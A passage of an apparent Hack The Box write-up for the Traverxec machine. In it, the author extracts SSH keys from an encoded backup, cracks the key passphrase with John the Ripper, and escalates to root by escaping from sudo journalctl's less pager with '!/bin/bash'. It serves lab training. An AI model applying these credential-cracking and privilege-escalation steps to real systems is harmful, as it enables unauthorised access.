+M1eYw+hV2hDAHSGLbHTqbWsuRojzT9s3hkFh51lXiUIuqmGOuC4tcXkWZCG/vkbHahurDGpmC465
+QH5kzORQg6fKD25u8eo5E+V96qWx2mVRBcuLGEzxGeeeoQOVxu0BH56NcrFZVtlrVhkgPorLcaip
+FsQST097rqEH6iS1VxYeXwiG6LC43HOnXeZ3Jz5d8TpC9eRRuPBwPiFjC8z8ncj9fWFY/5RhAvZY
+1bBlJ7kGzd54JbMspqfUPNde7KZigtS36aApT6T31qSQmVIApga1c9ORj0NuHIhMl5QnYOeQ6ydK
+DosbDNdsi2QVw6lUdlFiyK9blGcUvBAPwjGoEaA5dhC6k64xDKIOGm4hEDv04mzlN38RJ+esB1kn
+0ZlsipmJzcY4uyCOP+K8wS8YDF6BQVqhaQuUxntmugM56hklYxQso4sy7ElUU3p4iBfras5rLybx
+5lC2Kva9vpWRcUxzBGDPcz8wmSRaFsVfigB1uUfrGJB8B41Dtq5KMm2yhzhxcAYJl5fz4xQiRDP5
+1jEzhXMFQEo6ihUnhNc0R25hTn0Qpf4wByp8N/mdGQRmPmmLF5bBI6jKiy7mLbI76XmW2CfN+IBq
+mVm0rRDvU9dVihl7v0I1RmcWK2ZCYZe0KSRBVnCt/JijvovyLdiQBDe6AG6cgjoBPnvEukh3ibGF
+d+Y2jFh8u/ZMm/q5cCXEcCHTMZrciH6sMoRFFYj3mxCr8zoz8w3XS6A8O0y4xPKsbNzRZH3vVBds
+Mp0nVIv0rOC3OtfgTH8VToU/eXl+JhaeR5+Ja+pwZ885cLEgqV9sOL2z980ytld9cr8/naK4ronU
+pOjDYVkbMcz1NuG0M9zREGPuUJfHsEa6y9kAKjiysZfjPJ+a2baPreUGga1d1TG35A7mL4R9SuII
+FBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2jVzrrgBBD3sknSz4fT3irm
+6Zqg5SFeLGgaD67A12wlmPwvZ7E/O8v+9/LL9d+P3Rx/vxj/0fmPwL7Uf19+F7zrvz+A9/nvr33+
+e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA<span class="o">==</span>
+www-data@traverxec:/home/david/public_www/protected-file-area<span class="nv">$ </span>
+</pre></table></code></div></div><p>And i decoded the enoded text and save that in a <code class="language-plaintext highlighter-rouge">backup.tgz</code> file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre>➜  traverxec <span class="nb">echo</span> <span class="s2">"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"</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;&gt;</span> backup.tgz
+</pre></table></code></div></div><p>Then i Decompressed the <code class="language-plaintext highlighter-rouge">backup.tgz</code> file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>➜  traverxec <span class="nb">gunzip</span> <span class="nt">-c</span> backup.tgz | <span class="nb">tar </span>xvf - 
+home/david/.ssh/
+home/david/.ssh/authorized_keys
+home/david/.ssh/id_rsa
+home/david/.ssh/id_rsa.pub
+➜  traverxec
+</pre></table></code></div></div><p>The new dir <code class="language-plaintext highlighter-rouge">home</code> is decompressed</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>drwxr-xr-x  3 root root 4096 Apr 11 10:45 home
+</pre></table></code></div></div><p>This dir contain all the contents of <code class="language-plaintext highlighter-rouge">/home/david/.ssh</code> dir and the private ssh keys too <code class="language-plaintext highlighter-rouge">id_rsa</code></p><p>The id_rsa private keys are encypted so we can decrypt them using john But before doing this you have to convert the id_rsa into the hash format of john so john can decrypt the hash I used ssh2john.py to convert the key is suitable format</p><p><a href="https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/ssh2john.py" target="_blank">ssh2john</a></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>➜  .ssh python2 /usr/share/john/ssh2john.py id_rsa <span class="o">&gt;&gt;</span> ../../id_rsa_hash.txt
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>➜  traverxec john id_rsa_hash.txt <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
+finding a possible candidate.
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+hunter           <span class="o">(</span>id_rsa<span class="o">)</span>
+Warning: Only 2 candidates left, minimum 4 needed <span class="k">for </span>performance.
+1g 0:00:00:07 DONE <span class="o">(</span>2020-04-11 10:53<span class="o">)</span> 0.1335g/s 1914Kp/s 1914Kc/s 1914KC/sa6_123..<span class="k">*</span>7¡Vamos!
+Session completed
+</pre></table></code></div></div><p>We got the <strong>passpharse</strong> decrypted…. i.e <code class="language-plaintext highlighter-rouge">hunter</code></p><p>now we can login to <code class="language-plaintext highlighter-rouge">david</code> using the <code class="language-plaintext highlighter-rouge">id_rsa</code> by providing the passpharse we got for the encrpted id_rsa</p><h1 id="login-as-david">Login as david</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>➜  traverxec ssh <span class="nt">-i</span> home/david/.ssh/id_rsa david@traverxec.htb 
+The authenticity of host <span class="s1">'traverxec.htb (10.10.10.165)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>traverxec.htb<span class="s1">' (ECDSA) to the list of known hosts.
+Enter passphrase for key '</span>home/david/.ssh/id_rsa<span class="s1">': 
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+Last login: Fri Apr 10 17:00:54 2020 from 10.10.14.46
+david@traverxec:~$ whoami
+david
+</span></pre></table></code></div></div><p>And we are logged in successfully as <code class="language-plaintext highlighter-rouge">david</code></p><h1 id="got-usertxt">Got user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>david@traverxec:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+7db0-----------------------782f3d
+david@traverxec:~<span class="err">$</span>
+</pre></table></code></div></div><h1 id="privilege-escalation-by-exploiting-journalctl">Privilege Escalation By exploiting Journalctl</h1><p>In the user dir we have a directory called <code class="language-plaintext highlighter-rouge">bin</code></p><p>we have a <code class="language-plaintext highlighter-rouge">server-stats.sh</code> file in <strong>/home/david/bin</strong></p><p>If you run the server-stats.sh</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre>david@traverxec:~/bin<span class="nv">$ </span>bash server-stats.sh 
+                                                                          .----.
+                                                              .---------. | <span class="o">==</span> |
+   Webserver Statistics and Data                              |.-<span class="s2">"""""-.| |----|
+         Collection Script                                    ||       || | == |
+          (c) David, 2019                                     ||       || |----|
+                                                              |'-.....-'| |::::|
+                                                              '"")---(""' |___.|
+                                                             /:::::::::::</span><span class="se">\"</span><span class="s2">    "</span>
+                                                            /:::<span class="o">=======</span>:::<span class="se">\</span>
+                                                        jgs <span class="s1">'"""""""""""""'</span> 
+
+Load:  00:38:38 up 1 day,  5:31,  2 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+ 
+Open nhttpd sockets: 3
+Files <span class="k">in </span>the docroot: 117
+ 
+Last 5 journal log lines:
+<span class="nt">--</span> Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 00:38:38 EDT. <span class="nt">--</span>
+Apr 10 23:47:54 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: authentication failure<span class="p">;</span> <span class="nb">logname</span><span class="o">=</span> <span class="nv">uid</span><span class="o">=</span>33 <span class="nv">euid</span><span class="o">=</span>0 <span class="nb">tty</span><span class="o">=</span>/dev/pts/7 <span class="nv">ruser</span><span class="o">=</span>www-data <span class="nv">rhost</span><span class="o">=</span>  <span class="nv">user</span><span class="o">=</span>www-data
+Apr 10 23:47:56 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: conversation failed
+Apr 10 23:47:56 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: auth could not identify password <span class="k">for</span> <span class="o">[</span>www-data]
+Apr 10 23:47:56 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: www-data : <span class="nb">command </span>not allowed <span class="p">;</span> <span class="nv">TTY</span><span class="o">=</span>pts/7 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/tmp <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>list
+Apr 10 23:47:56 traverxec crontab[4194]: <span class="o">(</span>www-data<span class="o">)</span> LIST <span class="o">(</span>www-data<span class="o">)</span>
+
+</pre></table></code></div></div><p>There is a some type of journal logs in the output</p><p>Lets read the content of the script</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="nb">cat</span> /home/david/bin/server-stats.head
+<span class="nb">echo</span> <span class="s2">"Load: </span><span class="sb">`</span>/usr/bin/uptime<span class="sb">`</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">" "</span>
+<span class="nb">echo</span> <span class="s2">"Open nhttpd sockets: </span><span class="sb">`</span>/usr/bin/ss <span class="nt">-H</span> sport <span class="o">=</span> 80 | /usr/bin/wc <span class="nt">-l</span><span class="sb">`</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">"Files in the docroot: </span><span class="sb">`</span>/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc <span class="nt">-l</span><span class="sb">`</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">" "</span>
+<span class="nb">echo</span> <span class="s2">"Last 5 journal log lines:"</span>
+/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service | /usr/bin/cat 
+</pre></table></code></div></div><p>So the file displaying the content of <code class="language-plaintext highlighter-rouge">/home/david/bin/server-stats.head</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nb">cat</span> /home/david/bin/server-stats.head
+</pre></table></code></div></div><p>here is server-stats.head</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>david@traverxec:~/bin<span class="nv">$ </span><span class="nb">cat </span>server-stats.head 
+                                                                          .----.
+                                                              .---------. | <span class="o">==</span> |
+   Webserver Statistics and Data                              |.-<span class="s2">"""""-.| |----|
+         Collection Script                                    ||       || | == |
+          (c) David, 2019                                     ||       || |----|
+                                                              |'-.....-'| |::::|
+                                                              '"")---(""' |___.|
+                                                             /:::::::::::</span><span class="se">\"</span><span class="s2">    "</span>
+                                                            /:::<span class="o">=======</span>:::<span class="se">\</span>
+                                                        jgs <span class="s1">'"""""""""""""'</span> 
+
+</pre></table></code></div></div><p>At the bottom of that shell script theere is a command that is beign included and it is running as root</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service | /usr/bin/cat 
+</pre></table></code></div></div><p>So we got a hint that we can run journalctl as root …..</p><p>I searched about this binary on the <code class="language-plaintext highlighter-rouge">GtfoBins</code> And i got the exploitable methods for this binary.</p><p><a href="https://gtfobins.github.io/gtfobins/journalctl/" target="_blank">journalctl-Gtfobins</a></p><p>This invokes the default pager, which is likely to be <a href="https://gtfobins.github.io/gtfobins/less/" target="_blank">less</a> , other functions may apply.</p><p>This might not work if run by unprivileged users depending on the system configuration.</p><p>So what we need to actually do is run <code class="language-plaintext highlighter-rouge">journalctl</code> as root without that cat command so <code class="language-plaintext highlighter-rouge">less</code> can be invoked. and we can run commands in less pager by just providing <code class="language-plaintext highlighter-rouge">!command</code> since we ran the journalctl as root so the command that we will run in the less will be run as <code class="language-plaintext highlighter-rouge">root</code>.</p><p>run the jornalctl as root</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>david@traverxec:~<span class="nv">$ </span>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
+</pre></table></code></div></div><p>And we got the less invoked</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>david@traverxec:~<span class="nv">$ </span>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
+<span class="nt">--</span> Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 01:14:31 EDT. <span class="nt">--</span>
+Apr 10 23:47:54 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: authentication failure<span class="p">;</span> <span class="nb">logname</span><span class="o">=</span> <span class="nv">uid</span><span class="o">=</span>33 <span class="nv">euid</span><span class="o">=</span>0 <span class="nb">tty</span><span class="o">=</span>/dev/pts/7 <span class="nv">ruser</span><span class="o">=</span>www-data <span class="nv">rhost</span><span class="o">=</span>  <span class="nv">user</span><span class="o">=</span>w
+Apr 10 23:47:56 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: conversation failed
+Apr 10 23:47:56 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: auth could not identify password <span class="k">for</span> <span class="o">[</span>www-data]
+Apr 10 23:47:56 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: www-data : <span class="nb">command </span>not allowed <span class="p">;</span> <span class="nv">TTY</span><span class="o">=</span>pts/7 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/tmp <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>list
+Apr 10 23:47:56 traverxec crontab[4194]: <span class="o">(</span>www-data<span class="o">)</span> LIST <span class="o">(</span>www-data<span class="o">)</span>
+lines 1-6/6 <span class="o">(</span>END<span class="o">)</span>
+</pre></table></code></div></div><p>If u type an <code class="language-plaintext highlighter-rouge">!</code> you are now ready to run a command</p><p>So i do a command <code class="language-plaintext highlighter-rouge">/bin/bash</code> to spawn a bash shell since the less is running as root the root shell will be spawned</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>david@traverxec:~<span class="nv">$ </span>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
+<span class="nt">--</span> Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 01:14:31 EDT. <span class="nt">--</span>
+Apr 10 23:47:54 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: authentication failure<span class="p">;</span> <span class="nb">logname</span><span class="o">=</span> <span class="nv">uid</span><span class="o">=</span>33 <span class="nv">euid</span><span class="o">=</span>0 <span class="nb">tty</span><span class="o">=</span>/dev/pts/7 <span class="nv">ruser</span><span class="o">=</span>www-data <span class="nv">rhost</span><span class="o">=</span>  <span class="nv">user</span><span class="o">=</span>w
+Apr 10 23:47:56 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: conversation failed
+Apr 10 23:47:56 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: pam_unix<span class="o">(</span><span class="nb">sudo</span>:auth<span class="o">)</span>: auth could not identify password <span class="k">for</span> <span class="o">[</span>www-data]
+Apr 10 23:47:56 traverxec <span class="nb">sudo</span><span class="o">[</span>4133]: www-data : <span class="nb">command </span>not allowed <span class="p">;</span> <span class="nv">TTY</span><span class="o">=</span>pts/7 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/tmp <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>list
+Apr 10 23:47:56 traverxec crontab[4194]: <span class="o">(</span>www-data<span class="o">)</span> LIST <span class="o">(</span>www-data<span class="o">)</span>
+<span class="o">!</span>/bin/bash
+root@traverxec:/home/david# 
+</pre></table></code></div></div><p>And here we got the root shell</p><h1 id="got-roottxt">Got root.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>root@traverxec:/root#cat root.txt
+9aa-----------------------e0d906
+</pre></table></code></div></div><p>And i pwned it…</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/nostromo/" class="post-tag no-text-decoration" >nostromo</a> <a href="/tags/john/" class="post-tag no-text-decoration" >john</a> <a href="/tags/cracking-id_rsa/" class="post-tag no-text-decoration" >cracking-id_rsa</a> <a href="/tags/journalctl/" class="post-tag no-text-decoration" >journalctl</a> <a href="/tags/gtfobins/" class="post-tag no-text-decoration" >Gtfobins</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Traverxec writeup - 0xPrashant&url=http://localhost:4000/posts/htb-traverxec/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Traverxec writeup - 0xPrashant&u=http://localhost:4000/posts/htb-traverxec/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Traverxec writeup - 0xPrashant&url=http://localhost:4000/posts/htb-traverxec/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-openadmin/"><div class="card-body"> <span class="timeago small" > May 1 <i class="unloaded">2020-05-01T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Openadmin writeup</h3><div class="text-muted small"><p> Information@openadmin:~$ Column Details Name Openadmin IP 10.10.10.171 Points 20 Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blackfield/"><div class="card-body"> <span class="timeago small" > Jun 9 <i class="unloaded">2020-06-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blackfield writeup</h3><div class="text-muted small"><p> Introduction@Blackfield:~$ Column Details Name Blackfield IP 10.10.10.192 Points 40 Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/hackthebox-resolute/" class="btn btn-outline-primary"><p>Hackthebox Resolute writeup</p></a> <a href="/posts/htb-control/" class="btn btn-outline-primary"><p>Hackthebox Control writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-traverxec/'; this.page.identifier = '/posts/htb-traverxec/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const 